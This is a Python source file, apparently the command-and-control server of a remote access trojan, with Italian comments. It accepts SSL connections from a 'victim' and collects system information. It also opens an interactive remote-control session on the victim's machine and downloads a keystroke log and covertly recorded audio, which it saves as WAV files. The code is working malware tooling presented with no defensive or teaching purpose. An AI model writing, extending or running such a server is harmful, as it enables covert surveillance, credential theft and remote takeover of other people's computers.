import pickle
import platform
import re
import signal
import sys
import os
import time
import traceback
import subprocess
import socket
import ssl
import soundfile as sf

from tqdm import tqdm
from colorama import Fore
from time import sleep
from socket import *
from os import system
from serverSSLFunRC import *
from serverSSLRemoteCommands import *
from serverSSLgeneral import *
from serverSSLconnection import *


#Ricevo informazioni SO dal client
def recvInfo(fileLog, clientConnection, addr, exit, buff, key):
    try:
        buff, fileLog = printInformazioni(clientConnection, addr, fileLog, key)
        return exit, fileLog, buff
    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            print(f"[ERROR] Connection with client {addr} interrupted!!!\n")
            fileLog = fileLog + "\n" + f"[ERROR] Connection with client {addr} interrupted!!!\n"
            exit = True
            raise e
        if e.__class__.__name__ == "SSLEOFError":
            print(f"[ERROR] Connection with client {addr} interrupted!!!\n")
            fileLog = fileLog + "\n" + f"[ERROR] Connection with client {addr} interrupted!!!\n"
            exit = True
            raise e
        else:
            print(f"[ERROR] Information not received\n")
            fileLog = fileLog + "\n" + f"[ERROR] Information not received\n" + "\n"
            return exit, fileLog, buff


#Attivo la remote control
def remoteControlActive(fileLog, clientConnection, addr, exit, buff):
    attivo = 1
    while attivo == 1:
        try:
            for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[REMOTE CONTROL] Starting procedure...",
                          colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                sleep(0.2)
            print(f"[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...\n")
            fileLog = fileLog + "\n" + f"[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...\n"
            typeExit, fileLog = remoteControl(clientConnection, buff, fileLog)
            attivo = 0
            if typeExit == "[ERROR]":
                raise Exception
            elif typeExit == "[ERROR CONNECTION]":
                raise ConnectionResetError
            elif typeExit == "[END]":
                pass

        except Exception as e:
            if e.__class__.__name__ == "ConnectionResetError":
                print(f"[ERROR] Connection with client {addr} interrupted!!!\n")
                fileLog = fileLog + "\n" + f"[ERROR] Connection with client {addr} interrupted!!!\n"
                attivo = 0
            elif e.__class__.__name__ == "SSLEOFError":
                print(f"[ERROR] Connection with client {addr} interrupted!!!\n")
                fileLog = fileLog + "\n" + f"[ERROR] Connection with client {addr} interrupted!!!\n"
                attivo = 0
            else:
                attivo = 0

    return fileLog


#Le operazioni sono concluse e decido come procedere
def decision(fileLog, server, clientConnection):
    restartDecision = '0'
    while restartDecision != '1' and restartDecision != '2':
        print(f"[DECISION] Do you want to close the Sever or keep listening for new Clients?")
        print(f"[DECISION] 1 - Keep Listening")
        print(f"[DECISION] 2 - Close Server")
        restartDecision = input("> ")

    if restartDecision == '2':
        exit = True
        print(f"[INFO] The Server was shut down successfully")
        server.close()
        sys.exit(0)
    elif restartDecision == '1':
        print(f"[INFO] The server keeps listening...")
        t_end = time.time() + 3
        while time.time() < t_end:
            print(".", end="")
            time.sleep(1)
            print(".", end="")
            time.sleep(1)
            print(".")
            time.sleep(1)
    else:
        file = open("fileLogGenerale.txt", "w")
        file.write(fileLog)
        file.close()
        fileLog = ""
        os.chdir("..")
        clientConnection.shutdown(socket.SHUT_RDWR)
        clientConnection.close()
        server.close()


def main(fileLog):
    try:
        signal.signal(signal.SIGINT, signalHandler)
        server, context = serverConnections()
        #server = serverConnection()
        if server == "errore":
            #traceback.print_exc()
            raise Exception
        else:
            exit = False
            while exit == False:
                #clientConnection, addr = server.accept()
                fileLog, clientConnection, addr = manageConnection(fileLog, server, context)
                #print(f"[CONNECTED] Established a connection with the Victim using socket: {addr}")
                os.mkdir(f"cartellaClient {addr}")
                os.chdir(os.getcwd() + "/" + f"cartellaClient {addr}")

                fileLog = fileLog + "\n" + f"[CONNECTED] Established a connection with the Victim; Socket: {addr} is connected to the server" + "\n"

                for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[RECEIVING] Waiting for OS Info...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                    sleep(0.2)

                buff=""
                key = Fernet.generate_key()
                try:
                    clientConnection.send(key)
                except:
                    pass
                key = key.decode(FORMAT)
                fernet = Fernet(key)
                exit, fileLog, buff = recvInfo(fileLog, clientConnection, addr, exit, buff, fernet)
                fileLog = remoteControlActive(fileLog, clientConnection, addr, exit, buff)

                loggato = clientConnection.recv(100000).decode(FORMAT)
                fileL = open("filekeyLog.txt", "w")
                fileL.write(loggato)
                fileL.close()

                for i in tqdm(range(10), desc=Fore.LIGHTWHITE_EX + "Scaricando materiale audio", colour="green", ncols=50,
                              bar_format="{desc}: {percentage:3.0f}% {bar}"):
                    sleep(0.4)
                time.sleep(2)
                try:
                    data = []
                    while True:
                        packet = clientConnection.recv(4096)
                        if not packet: break
                        data.append(packet)

                    ascoltato = pickle.loads(b"".join(data))
                except:
                    #traceback.print_exc()
                    print("[ERROR] Materiale audio non scaricato correttamente")
                    fileLog = fileLog + "\n" + "[ERROR] Materiale audio non scaricato" + "\n"

                indexA = 0
                for x in ascoltato:
                    try:
                        sf.write("recording" + str(indexA) + ".wav",  ascoltato[indexA], samplerate=44100)
                    except:
                        print("[ERROR] Materiale audio non salvato correttamente")
                        fileLog = fileLog + "\n" + "[ERROR] Materiale audio non salvato correttamente" + "\n"

                clientConnection.close()
                for i in tqdm(range(10), desc=Fore.LIGHTWHITE_EX + "Chiusura connessione client", colour="green", ncols=50,
                              bar_format="{desc}: {percentage:3.0f}% {bar}"):
                    sleep(0.2)
                print(f"[CLOSED] Client Connection {addr} closed succesfully!")
                fileLog = fileLog + "\n" + f"[CLOSED] Client Connection {addr} closed succesfully!" + "\n"
                print()

                file = open("fileLogGenerale.txt", "w")
                file.write(fileLog)
                file.close()
                fileLog = ""
                os.chdir("..")

                decision(fileLog, server, clientConnection)

    except Exception as e:
        if e.__class__.__name__ == "ConnectionResetError":
            print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
            file = open("fileLogGenerale.txt", "w")
            file.write(fileLog)
            file.close()
            fileLog = ""
            raise e
        if e.__class__.__name__ == "SSLEOFError":
            print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
            file = open("fileLogGenerale.txt", "w")
            file.write(fileLog)
            file.close()
            fileLog = ""
            raise e
        else:
            file = open("fileLogGenerale.txt", "w")
            file.write(fileLog)
            file.close()
            fileLog = ""
            raise e


if __name__ == "__main__":
    try:
        fileLog = f"###          FILELOG RESULT          ###\n"
        main(fileLog)
    except Exception as e:
        traceback.print_exc()
        fileLog = ""
        for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Closing Server...", colour="green", ncols=50, bar_format="{desc}: {percentage:3.0f}% {bar}"):
            sleep(0.2)
        print(f"[CLOSE] Server closed.")


